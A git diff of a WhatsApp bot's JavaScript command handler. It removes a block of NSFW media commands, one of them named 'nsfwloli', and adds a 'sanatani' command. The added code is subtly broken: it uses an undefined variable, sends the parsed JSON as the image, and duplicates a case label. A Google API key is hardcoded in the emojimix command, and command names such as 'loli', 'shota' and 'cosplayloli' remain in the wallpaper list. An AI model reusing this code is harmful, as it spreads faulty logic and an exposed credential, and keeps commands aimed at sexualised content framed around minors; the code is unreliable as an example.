@@ -3324,32 +3324,10 @@ case 'yts': case 'ytsearch': {
                 GODincBOT.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
             }
             break
-case 'xxxxplay':{
-if (!text) return replygcGOD(`Example : ${prefix+command} story wa anime`)
-GODStickWait()
-let search = await yts(text)
-url = search.videos[0].url
-let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
-eek = await getBuffer(anu.thumbnail)
-owned = `${ownernumber}@s.whatsapp.net`
-ngen = `
-Title : ${anu.title}
-Ext : Search
-ID : ${anu.videoId}
-Viewers : ${anu.views}
-Upload At : ${anu.ago}
-Author : ${anu.author.name}
-Channel : ${anu.author.url}
-Link : ${anu.url}
-
-Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`
-GODincBOT.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
-}
-break
 case 'play':  case 'song': {
 if (!text) return replygcGOD(`Example : ${prefix + command} anime whatsapp status`)
 const GODplaymp3 = require('./lib/ytdl2')
-let yts = require("youtube-yts")
+let yts = require("yt-search")
         let search = await yts(text)
         let anup3k = search.videos[0]
 const pl= await GODplaymp3.mp3(anup3k.url)
@@ -4972,8 +4950,13 @@ const i = Math.floor(Math.random() * wallpaper.length)
                 })
 //GODincBOT.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
 break
-case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
-
+case "sanatani":{
+let lord = JSON.parse(fs.readFileSync('./GODMEDIA/sanatani.json'))
+let result = lord[Math.floor(Math.random() * anutrest.length)]
+GODincBOT.sendMessage(m.chat, { image: lord , caption: mess.success  }, { quoted: m })
+}
+break
+case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko': case 'sanatani': {
 GODStickWait()
 let heyy
 if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/akira.json')
@@ -5009,9 +4992,6 @@ if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubuserconten
 if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/hestia.json')
 if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/husbu.json')
 if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/inori.json')
-if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/NEXUSAT12/XBOTmedia/master/sanatani.json') 
-	
-if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/islamic.json')
 if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/isuzu.json')
 if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/itachi.json')
 if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/itori.json')
@@ -5060,7 +5040,6 @@ if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubuserconten
 if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/sagiri.json')
 if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/sakura.json')
 if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/sasuke.json')
-if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/satanic.json')
 if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/shina.json')
 if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/shinka.json')
 if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/shinomiya.json')
@@ -5132,340 +5111,29 @@ replygcGOD(`Success`)
 }
 break
 
-            case 'id':{
-            replygcGOD(from)
-           }
-          break
-          case 'userjid':{
-          	if(!GODTheCreator) return GODStickOwner()
-        const groupMetadata = m.isGroup ? await GODincBOT.groupMetadata(m.chat).catch((e) => {}) : ""
-		const participants = m.isGroup ? await groupMetadata.participants : ""
-    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
-    for (let mem of participants) {
-            textt += `${themeemoji} ${mem.id}\n`
-        }
-      replygcGOD(textt)
-    }
-    break
-          case 'emojimix': {
-		let [emoji1, emoji2] = text.split`+`
-		if (!emoji1) return replygcGOD(`Example : ${prefix + command} 😅+🤔`)
-		if (!emoji2) return replygcGOD(`Example : ${prefix + command} 😅+🤔`)
-		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
-		for (let res of anumojimix.results) {
-		    let encmedia = await GODincBOT.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
-		    
-		}
-	    }
-	    break
-	case 'hentaivid2': {
-if (!m.isGroup) return GODStickGroup()
-
-if (!AntiNsfw) return replygGOD(mess.nsfw)
-GODStickWait()
-sbe = await hentaivid()
-cejd = sbe[Math.floor(Math.random(), sbe.length)]
-GODincBOT.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
-caption: `⭔ Title : ${cejd.title}
-⭔ Category : ${cejd.category}
-⭔ Mimetype : ${cejd.type}
-⭔ Views : ${cejd.views_count}
-⭔ Shares : ${cejd.share_count}
-⭔ Source : ${cejd.link}
-⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
+case 'id':{
+replygcGOD(from)
 }
 break
-	case 'hentaivid': case 'hentaivideo': {
-	if (!m.isGroup) return GODStickGroup()
-if (!AntiNsfw) return replygcGOD(mess.nsfw)
-                GODStickWait()
-                const { hentai } = require('./lib/scraper.js')
-                anu = await hentai()
-                result912 = anu[Math.floor(Math.random(), anu.length)]
-                GODincBOT.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
-            }
-            break
-case 'trap' :
-if (!m.isGroup) return GODStickGroup()
-if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
- waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
+case 'userjid':{
+if(!GODTheCreator) return GODStickOwner()
+const groupMetadata = m.isGroup ? await GODincBOT.groupMetadata(m.chat).catch((e) => {}) : ""
+const participants = m.isGroup ? await groupMetadata.participants : ""
+let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
+for (let mem of participants) {
+textt += `${themeemoji} ${mem.id}\n`
+}
+replygcGOD(textt)
+}
 break
-case 'hentai-neko' :
-case 'hneko' :
-if (!m.isGroup) return GODStickGroup()
-if (!AntiNsfw) return replygcGOD(mess.nsfw)
-    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
-break
-case 'hentai-waifu' :
-case 'nwaifu' :
-if (!m.isGroup) return GODStickGroup()
-if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
-break
-case 'gasm':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()						
- waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
-break  
-case 'milf':
-if (!m.isGroup) return GODStickGroup()
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/milf.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break 
-case 'animespank':
-if (!m.isGroup) return GODStickGroup()
-if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
- waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
-            await GODincBOT.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
-                    return('Error!')
-                })
-break
-case 'ahegao':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ahegao.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'ass':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'bdsm':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'blowjob':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'cuckold':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'cum':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'eba':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'ero':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'femdom':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'foot':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'gangbang':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'glasses':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'hentai':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'jahy':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/jahy.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'manga':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'masturbation':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'neko-hentai':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'neko-hentai2':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'nsfwloli':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'orgy':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'panties':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'pussy':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'tentacles':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'thighs':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thighs.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'yuri':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'zettai':
-if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/zettai.json'))
-var GODyresult = pickRandom(ahegaonsfw)
-GODincBOT.sendMessage(m.chat, { caption: mess.success, image: { url: GODyresult.url } }, { quoted: m })
-break
-case 'gifblowjob':
-if (!m.isGroup) return GODStickGroup()
-if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
-    var bobuff = await fetchBuffer(assss.data.url)
-    var bogif = await buffergif(bobuff)
-    await GODincBOT.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
-    })
-    break
-case 'gifhentai':
-if (!m.isGroup) return GODStickGroup()
-if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
-var GODyresultx = pickRandom(ahegaonsfw)
-    await GODincBOT.sendMessage(m.chat,{video:GODyresultx, gifPlayback:true },{quoted:m}).catch(err => {
-    })
-    break
-    case 'gifs': case 'foot': {
-if (!m.isGroup) return GODStickGroup()
-if (!AntiNsfw) return replygcGOD(mess.nsfw)
-GODStickWait()
-let heyy
-    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
-    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/gifs.json')
-    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGxeon/Xeonmedia/master/foot.json')
-GODincBOT.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
+case 'emojimix': {
+let [emoji1, emoji2] = text.split`+`
+if (!emoji1) return replygcGOD(`Example : ${prefix + command} 😅+🤔`)
+if (!emoji2) return replygcGOD(`Example : ${prefix + command} 😅+🤔`)
+let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
+for (let res of anumojimix.results) {
+let encmedia = await GODincBOT.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
+}
 }
 break
 case 'animeawoo':{
@@ -6028,11 +5696,11 @@ isForwarded: true,
 { quoted: m})        
             }
             break
- case 'couple': {
-            if (!m.isGroup) return GODStickGroup()
-            let member = participants.map(u => u.id)
-            let orang = member[Math.floor(Math.random() * member.length)]
-            let jodoh = member[Math.floor(Math.random() * member.length)]
+case 'couple': {
+if (!m.isGroup) return GODStickGroup()
+let member = participants.map(u => u.id)
+let orang = member[Math.floor(Math.random() * member.length)]
+let jodoh = member[Math.floor(Math.random() * member.length)]
 GODincBOT.sendMessage(m.chat,
 { text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
 Cieeee, What's Going On❤️💖👀`,
@@ -6050,40 +5718,40 @@ isForwarded: true,
 "thumbnail": fs.readFileSync(`./GODMEDIA/theme/GODBOTPIC.jpg`),
 "sourceUrl": `${wagc}`}}},
 { quoted: m})        
-            }
-            break
-                        case 'coffee': case 'kopi': {
-                GODincBOT.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
-            }
-            break
-            case 'wallpaper': {
-                if (!text) return replygcGOD('Enter Query Title')
-                GODStickWait()
-		let { wallpaper } = require('./lib/scraper')
-                anuwallpep = await wallpaper(text)
-                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
-                GODincBOT.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
-            }
-            break
-            case 'wikimedia': {
-                if (!text) return replygcGOD('Enter Query Title')
-                GODStickWait()
-		let { wikimedia } = require('./lib/scraper')
-                let anumedia = await wikimedia(text)
-                result = anumedia[Math.floor(Math.random() * anumedia.length)]
-                GODincBOT.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
-            }
-            break
-            case 'pick': {
-            	if (!m.isGroup) return GODStickGroup()
-            	if (!text) return replygcGOD(`What do you want to pick?\nExample: ${prefix + command} idiot`)
-             const groupMetadata = m.isGroup ? await GODincBOT.groupMetadata(m.chat)
-                 .catch((e) => {}) : ""
-             const participants = m.isGroup ? await groupMetadata.participants : ""
-             let member = participants.map((u) => u.id)
-             let me = m.sender
-             let GODshimts = member[Math.floor(Math.random() * member.length)]
-             GODincBOT.sendMessage(from, { 
+}
+break
+case 'coffee': case 'kopi': {
+GODincBOT.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
+}
+break
+case 'wallpaper': {
+if (!text) return replygcGOD('Enter Query Title')
+GODStickWait()
+let { wallpaper } = require('./lib/scraper')
+anuwallpep = await wallpaper(text)
+let result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
+GODincBOT.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
+}
+break
+case 'wikimedia': {
+if (!text) return replygcGOD('Enter Query Title')
+GODStickWait()
+let { wikimedia } = require('./lib/scraper')
+let anumedia = await wikimedia(text)
+result = anumedia[Math.floor(Math.random() * anumedia.length)]
+GODincBOT.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
+}
+break
+case 'pick': {
+if (!m.isGroup) return GODStickGroup()
+if (!text) return replygcGOD(`What do you want to pick?\nExample: ${prefix + command} idiot`)
+const groupMetadata = m.isGroup ? await GODincBOT.groupMetadata(m.chat)
+.catch((e) => {}) : ""
+const participants = m.isGroup ? await groupMetadata.participants : ""
+let member = participants.map((u) => u.id)
+let me = m.sender
+let GODshimts = member[Math.floor(Math.random() * member.length)]
+GODincBOT.sendMessage(from, { 
 text: `The most *${text}* here is *@${GODshimts.split("@")[0]}*`,
 contextInfo:{
 forwardingScore: 9999999,
@@ -6101,9 +5769,9 @@ mentionedJid:[GODshimts],
 }
 }
 }, { quoted: m })
-         }
-     break
-     case "igvid": case "instavid": {
+}
+break
+case "igvid": case "instavid": {
 if (!text) return replygcGOD(`Where is the link?\n\nExample : ${prefix + command} https://www.instagram.com/reel/Ctjt0srIQFg/?igshid=MzRlODBiNWFlZA==`)
 GODStickWait()
 let resGODyinsta = await GODInstaMp4(text)
@@ -6113,9 +5781,9 @@ break
 case 'igstalk': {
 if (!args[0]) return replygcGOD(`Enter Instagram Username\n\nExample: ${prefix + command} unucorn_GOD13`)
 const fg = require('api-dylux')
-    try {
-    let res = await fg.igStalk(args[0])
-    let te = `
+try {
+let res = await fg.igStalk(args[0])
+let te = `
 ┌──「 *STALKING* 
 ▢ *🔖Name:* ${res.name} 
 ▢ *🔖Username:* ${res.username}
@@ -6125,13 +5793,13 @@ const fg = require('api-dylux')
 ▢ *🏝️Posts:* ${res.postsH}
 ▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
 └────────────`
-     await GODincBOT.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
-      } catch {
-        replygcGOD(`Make sure the username comes from *Instagram*`)
-      }
+await GODincBOT.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
+} catch {
+replygcGOD(`Make sure the username comes from *Instagram*`)
+}
 }
 break
-           case "igimg": case "instaimg":  {
+case "igimg": case "instaimg":  {
 if (!text) return replygcGOD(`Where is the link?\n\nExample : ${prefix + command} https://www.instagram.com/p/Cs8x1ljt_D9/?igshid=MzRlODBiNWFlZA==`)
 GODStickWait()
 const risponsGOD = await GODIgImg(text)
@@ -6154,39 +5822,51 @@ let res = await GODTwitter(q)
 let ghdx = await GODincBOT.sendMessage(from,{video:{url: res.url[0].url},caption: mess.success},{quoted:m})
 }
 break
-    case 'say': case 'tts': case 'gtts':{
+case 'say': case 'tts': case 'gtts':{
 if (!text) return replygcGOD('Where is the text?')
-            let texttts = text
-            const GODrl = googleTTS.getAudioUrl(texttts, {
-                lang: "en",
